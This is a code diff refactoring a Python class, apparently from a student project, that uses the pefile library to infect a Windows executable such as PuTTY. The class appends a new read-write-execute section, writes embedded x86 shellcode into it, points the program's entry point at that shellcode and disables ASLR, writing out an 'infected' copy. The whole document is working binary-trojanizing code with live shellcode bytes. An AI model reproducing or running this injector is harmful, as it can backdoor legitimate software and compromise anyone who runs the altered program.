@@ -1,6 +1,13 @@
+import pefile
+import os
+
 class Injection():
-    def __init__(self,):
-        shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
+    def __init__(self,pathToExe,pathToBadExe,sectionName):
+        self.pathToExe = pathToExe
+        self.pathToBadExe = pathToBadExe
+        self.sectionName = sectionName
+
+        self.shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                           b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                           b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                           b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
@@ -23,13 +30,76 @@ class Injection():
                           b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
                           b"\x51\x52\xff\xd0\xB8\x96\xFE\x46\x00\xFF\xD0")
 
-        def adjust_SectionSize(size, align):
-            if size % align:
-                size = ((size + align) // align) * align
-            return size
+    def infect(self):
 
-        pe = pefile.PE('../putty.exe')
+        pe = pefile.PE(self.pathToExe)
 
+        self.creation_HeaderSection(pe)
+
+
+    def adjust_SectionSize(self,size, align):
+        if size % align:
+            size = ((size + align) // align) * align
+        return size
+
+    def addInSectionsTab(self, pe, new_section, new_section_data):
+        pe.sections.append(new_section)
+        pe.__structures__.append(new_section)
+        pe.__data__ = bytearray(pe.__data__) + new_section_data
+        pe.write(self.pathToBadExe)
+        print(new_section)
+
+    def updateOEP(self,pe, new_section, new_section_data):
+        pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
+        pe.FILE_HEADER.NumberOfSections += 1
+        pe.OPTIONAL_HEADER.SizeOfImage += self.adjust_SectionSize(0x1000, pe.OPTIONAL_HEADER.SectionAlignment)
+
+        self.addInSectionsTab(pe, new_section, new_section_data)
+
+    def addShellcodeIntoSection(self,pe, pad, new_section):
+        new_section_data = bytearray(pad + new_section.SizeOfRawData)
+        new_section_data[pad:324] = self.shellcode
+
+        self.updateOEP(pe, new_section, new_section_data)
+
+    def resize_exe(self,pe, path, new_section, last_section):
+
+        # Need the diff between lastSection and EOF to get the size of the garbage
+        # On obtient la taile de l'exe
+        original_size = os.path.getsize(path)
+        # On fait la différence entre la taille original et les données qu'on a rajouter sur le disque
+        diff = original_size - (last_section.PointerToRawData + last_section.SizeOfRawData)
+        # Add GarbageSize + lastSection to get next valid PointerToRawData
+        NewPointerToRawData = self.adjust_SectionSize(
+            (diff + last_section.PointerToRawData + last_section.SizeOfRawData),
+            pe.OPTIONAL_HEADER.SectionAlignment)
+        new_section.PointerToRawData = NewPointerToRawData
+        # Padding between EOF and next section
+        pad = NewPointerToRawData - original_size
+
+        self.addShellcodeIntoSection(pe, pad, new_section)
+
+    def initialization_HeaderSection(self,pe, new_section, last_section):
+        # Le nom du header de la section
+        new_section.Name = str.encode(self.sectionName)
+        # On ajoute 4096 octets à la taille de la section sur le disque en alignant avec FileAlignment
+        new_section.SizeOfRawData = self.adjust_SectionSize(
+            0x1000, pe.OPTIONAL_HEADER.FileAlignment)
+        # La taille virtuelle de la section
+        new_section.Misc_VirtualSize = 0x1000
+        # Marche sans : new_section.Misc = 0x1000
+        # Marche sans : new_section.Misc_PhysicalAddress = 0x1000
+        # On aligne l'adresse Virtuelle avec la Section Alignment -> Obligatoire
+        new_section.VirtualAddress = last_section.VirtualAddress + self.adjust_SectionSize(last_section.Misc_VirtualSize,
+                                                                                      pe.OPTIONAL_HEADER.SectionAlignment)
+        # Characteristics : On met les flags suivants : droit en Lecture / Ecriture /  Execution / Section contient du code
+        new_section.Characteristics = 0xE0000020
+        # Disable ASLR
+        pe.OPTIONAL_HEADER.DllCharacteristics -= 0x40
+
+        self.resize_exe(pe, self.pathToExe , new_section, last_section)
+
+    def creation_HeaderSection(self,pe):
         new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
         number_sections = pe.FILE_HEADER.NumberOfSections - 1
         last_section = pe.sections[number_sections]
@@ -37,45 +107,5 @@ class Injection():
         new_section.set_file_offset(
             pe.sections[number_sections].get_file_offset() + 40)
 
-        new_section.Name = b'.ESGI'
-        new_section.SizeOfRawData = adjust_SectionSize(
-            0x1000, pe.OPTIONAL_HEADER.FileAlignment)
-        new_section.Misc_VirtualSize = 0x1000
-        new_section.Misc = 0x1000
-        new_section.Misc_PhysicalAddress = 0x1000
+        self.initialization_HeaderSection(pe, new_section, last_section)
 
-        new_section.VirtualAddress = last_section.VirtualAddress + \
-                                     adjust_SectionSize(last_section.Misc_VirtualSize,
-                                                        pe.OPTIONAL_HEADER.SectionAlignment)
-
-        # Compute the next aligned value for PointerToRawData
-        # Need the diff between lastSection and EOF to get the size of the garbage
-        original_size = os.path.getsize('../putty.exe')
-        diff = original_size - (last_section.PointerToRawData +
-                                last_section.SizeOfRawData)
-        # Add GarbageSize + lastSection to get next valid PointerToRawData
-        next_aligned = adjust_SectionSize(
-            (diff + last_section.PointerToRawData +
-             last_section.SizeOfRawData), pe.OPTIONAL_HEADER.SectionAlignment)
-        new_section.PointerToRawData = next_aligned
-        # Padding between EOF and next section
-        pad = next_aligned - original_size
-        new_section_data = bytearray(pad + new_section.SizeOfRawData)
-        new_section_data[pad:283] = shellcode
-
-        new_section.Characteristics = 0xE0000020
-        pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
-        pe.FILE_HEADER.NumberOfSections += 1
-        pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(
-            0x1000, pe.OPTIONAL_HEADER.SectionAlignment)
-        # https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#dll-characteristics
-        # Disable ASLR
-        pe.OPTIONAL_HEADER.DllCharacteristics -= 0x40
-
-        pe.sections.append(new_section)
-        pe.__structures__.append(new_section)
-        pe.__data__ = bytearray(pe.__data__) + new_section_data
-
-        pe.write('infected.exe')
-
-        print(new_section)
